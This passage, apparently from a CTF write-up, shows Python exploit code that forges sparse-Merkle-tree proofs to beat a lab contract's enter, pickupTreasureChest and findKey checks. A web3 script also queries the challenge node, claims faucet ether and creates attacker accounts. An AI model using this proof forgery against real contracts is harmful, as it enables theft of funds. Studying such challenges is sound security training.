class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class="line">    proof[<span class="number">18</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">19</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class="line">    proof[<span class="number">20</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">21</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">        proof[i] = <span class="built_in">bytes</span>.fromhex(proof[i][<span class="number">2</span>:])</span><br><span class="line">    root = calcRoot(proof,nextLeaves,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getProof</span>(<span class="params">b1,b2,h</span>):</span><br><span class="line">    proof = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    proof[<span class="number">0</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">1</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">2</span>] = h</span><br><span class="line">    proof[<span class="number">3</span>] = b1</span><br><span class="line">    proof[<span class="number">4</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">5</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">6</span>] = b2</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        proof[i] = <span class="built_in">bytes</span>.fromhex(proof[i][<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> proof</span><br><span class="line"></span><br><span class="line">    leaf[<span class="number">0</span>] = <span class="number">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class="line">    leaf[<span class="number">1</span>] = <span class="number">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class="line">    leaf[<span class="number">2</span>] = <span class="number">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class="line">    leaf[<span class="number">3</span>] = <span class="number">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class="line">    leaf[<span class="number">4</span>] = <span class="number">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter1</span>(<span class="params">oldroot</span>):</span><br><span class="line">    b1 = <span class="string">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    prevLeaves = [Leaf(<span class="number">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span>,<span class="number">0</span>)]</span><br><span class="line">    nextLeaves = [Leaf(<span class="number">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span>,<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class="line">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter2</span>(<span class="params">oldroot</span>):</span><br><span class="line">    b1 = <span class="string">&#x27;0x799d6ded98975eb22e289ea90ff6f3f327537299ab8325e695c61d31ee711c56&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    <span class="comment"># 根据顺序调整height </span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000002&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    prevLeaves = [Leaf(<span class="number">0x1424021b77400221b9E86422571F76bF50acd44c</span>,<span class="number">0</span>)]</span><br><span class="line">    nextLeaves = [Leaf(<span class="number">0x1424021b77400221b9E86422571F76bF50acd44c</span>,<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class="line">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter3</span>(<span class="params">oldroot</span>):</span><br><span class="line">    b1 = <span class="string">&#x27;0xcc2f18436e39156aa78964ff9e33acb4778bfd7a3182a20a5e86e2578a2dd334&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    prevLeaves = [Leaf(<span class="number">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span>,<span class="number">0</span>)]</span><br><span class="line">    nextLeaves = [Leaf(<span class="number">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span>,<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class="line">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter4</span>(<span class="params">oldroot</span>):</span><br><span class="line">    b1 = <span class="string">&#x27;0x68ee889a32ce609fc0acbf31dd1cc40b522d2c1fcabc0b0d5d2cd66cde478338&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    prevLeaves = [Leaf(<span class="number">0x45AD33c37e5029804794f390cB2474349F2aDf12</span>,<span class="number">0</span>)]</span><br><span class="line">    nextLeaves = [Leaf(<span class="number">0x45AD33c37e5029804794f390cB2474349F2aDf12</span>,<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class="line">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter5</span>(<span class="params">oldroot</span>):</span><br><span class="line">    b1 = <span class="string">&#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    prevLeaves = [Leaf(<span class="number">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span>,<span class="number">0</span>)]</span><br><span class="line">    nextLeaves = [Leaf(<span class="number">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span>,<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----enter5----&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------------&#x27;</span>)</span><br><span class="line">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pickupTreasureChest</span>(<span class="params">oldroot</span>):</span><br><span class="line">    <span class="comment"># 先做这个 根据递增的要求构造出5个地址 记录merge的顺序</span></span><br><span class="line">    c1 = <span class="string">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class="line">    c2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    leaf = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    leaf[<span class="number">0</span>] = <span class="number">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class="line">    leaf[<span class="number">1</span>] = <span class="number">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class="line">    leaf[<span class="number">2</span>] = <span class="number">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class="line">    leaf[<span class="number">3</span>] = <span class="number">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class="line">    leaf[<span class="number">4</span>] = <span class="number">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(leaf)):</span><br><span class="line">        leaf[i] = Leaf(leaf[i],<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    n = <span class="number">19</span></span><br><span class="line">    proof = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    proof[<span class="number">0</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">1</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">2</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">3</span>] = c1</span><br><span class="line">    proof[<span class="number">4</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">5</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">6</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class="line">    </span><br><span class="line">    proof[<span class="number">7</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">8</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">9</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof[<span class="number">10</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">11</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">12</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof[<span class="number">13</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">14</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">15</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof[<span class="number">16</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">17</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">18</span>] = c2</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        proof[i] = <span class="built_in">bytes</span>.fromhex(proof[i][<span class="number">2</span>:])</span><br><span class="line">    root = calcRoot(proof,leaf,oldroot)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findKey</span>(<span class="params">oldroot</span>):</span><br><span class="line">    c1 = <span class="string">&#x27;0xbccd02410d2e51fe9783b9597d341834148ebbfd545ad02023fcf29e54ffc35e&#x27;</span></span><br><span class="line">    c2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    leaf = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    leaf[<span class="number">0</span>] = <span class="number">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class="line">    leaf[<span class="number">1</span>] = <span class="number">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class="line">    leaf[<span class="number">2</span>] = <span class="number">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class="line">    leaf[<span class="number">3</span>] = <span class="number">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class="line">    leaf[<span class="number">4</span>] = <span class="number">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(leaf)):</span><br><span class="line">        leaf[i] = Leaf(leaf[i],<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    n = <span class="number">19</span></span><br><span class="line">    proof = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    proof[<span class="number">0</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">1</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">2</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">3</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class="line">    </span><br><span class="line">    proof[<span class="number">4</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">5</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">6</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class="line">    </span><br><span class="line">    proof[<span class="number">7</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">8</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">9</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class="line">    </span><br><span class="line">    proof[<span class="number">10</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">11</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">12</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof[<span class="number">13</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">14</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">15</span>] = c1</span><br><span class="line"></span><br><span class="line">    proof[<span class="number">16</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">17</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">18</span>] = c2</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        proof[i] = <span class="built_in">bytes</span>.fromhex(proof[i][<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">assert</span> calcRoot(proof,leaf,oldroot) == oldroot</span><br><span class="line">    <span class="keyword">return</span> oldroot</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def leave(oldroot):</span></span><br><span class="line"><span class="string">    b1 = &#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class="line"><span class="string">    b2 = &#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line"><span class="string">    h = &#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"><span class="string">    proof = getProof(b1,b2,h)</span></span><br><span class="line"><span class="string">    prevLeaves = [Leaf(0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd,1)]</span></span><br><span class="line"><span class="string">    nextLeaves = [Leaf(0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd,0)]</span></span><br><span class="line"><span class="string">    assert calcRoot(proof,prevLeaves,oldroot) == oldroot</span></span><br><span class="line"><span class="string">    print(&#x27;next&#x27;)</span></span><br><span class="line"><span class="string">    root = calcRoot(proof,nextLeaves,oldroot)</span></span><br><span class="line"><span class="string">    return root</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    root = init()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;---------init finish------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    root = enter1(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    root = enter2(root)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    root = enter3(root)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    root = enter4(root)</span><br><span class="line">  </span><br><span class="line">    root = enter5(root)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    root = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    root = pickupTreasureChest(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    findKey(root)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#print(calcLeaf(Leaf(0x07DEB941F3feA2B239996E723E0000C8d79d3b38,1)).hex())</span></span><br></pre></td></tr></table></figure>


<p>每次enter只需要记录上次enter修改root的最后一次merge就行<br>但pickupTreasureChest需要用到每次merge的信息<br>并且calcRoot计算的时候需要根据key决定merge的顺序<br>所以4个hacker的地址是需要精心构造的<br>先模拟一遍pickupTreasureChest 然后根据merge的顺序对应调整enter时merge的顺序（改height）<br>findKey的思路和enter差不多，因为mode是0所以value是0，只要把0都merge掉然后拿最后两个哈希值做一遍merge就能通过验证</p>
<p>exp用了5次enter是因为本来以为需要利用一次leave，后来发现不需要，实际上4次enter就够了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_abi <span class="keyword">import</span> encode_abi</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ONE_SHOT_MODE = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;http://123.60.45.88:8545&quot;</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># Globals</span></span><br><span class="line">keccak = w3.keccak</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMoney</span>(<span class="params">target</span>):</span><br><span class="line">    <span class="built_in">print</span>(w3.eth.get_balance(target))</span><br><span class="line">    <span class="keyword">assert</span> requests.post(<span class="string">&#x27;http://123.60.45.88:8080/api/claim&#x27;</span>, data = &#123;<span class="string">&#x27;address&#x27;</span>: target&#125;).status_code == <span class="number">200</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] waiting for 30s for test ether&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(w3.eth.get_balance(target))</span><br><span class="line"></span><br><span class="line">deploy = <span class="string">&#x27;0x1a20D3FF9D41440D9C6B93462A4f656496c693F8&#x27;</span></span><br><span class="line"><span class="comment">#getMoney(deploy)</span></span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line">final_target = <span class="string">&#x27;0x6991DD5156BBD73aae507F6A6020C960F2F8b9e7&#x27;</span></span><br><span class="line">root = w3.eth.get_storage_at(final_target,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">target</span>):</span><br><span class="line">    code = w3.eth.get_code(target)</span><br><span class="line">    storage = w3.eth.get_storage_at(target,<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;root:<span class="subst">&#123;storage.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    storage = w3.eth.get_storage_at(target,<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;smtMode:<span class="subst">&#123;storage.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    storage = w3.eth.get_storage_at(target,<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;address:<span class="subst">&#123;storage.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    storage = w3.eth.get_storage_at(target,<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;solved:<span class="subst">&#123;storage.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">check(final_target)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAccount</span>():</span><br><span class="line">    acc = w3.eth.account.create()</span><br><span class="line">    hacker, sk_hacker = 